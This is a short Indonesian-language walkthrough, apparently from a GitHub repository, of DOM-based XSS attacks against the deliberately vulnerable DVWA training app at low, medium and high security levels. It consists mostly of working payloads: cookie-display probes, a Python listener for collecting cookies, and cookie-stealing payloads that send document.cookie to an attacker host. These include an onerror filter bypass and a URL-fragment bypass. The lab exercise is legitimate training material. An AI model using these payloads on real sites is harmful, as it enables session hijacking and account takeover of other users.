# XSS (DOM)
DOM based XSS muncul ketika Javascript mengambil data dari sumber yang dapat dikontrol oleh penyerang misalnya seperti URL, yang memungkinkan penyerang mengeksekusi code JavaScript yang berbahaya dan membajak akun pengguna lain.

## Security Low
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2013.JPG)

Membuat halaman untuk menampung cookie
```sh
python3 -m http.server 80
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2014.JPG)

## Security Medium
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=alert(document.cookie)>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=window.location='http://<IP_Attacker>/?cookie='+document.cookie>
```

## Security High
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>alert(document.cookie);</script>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```
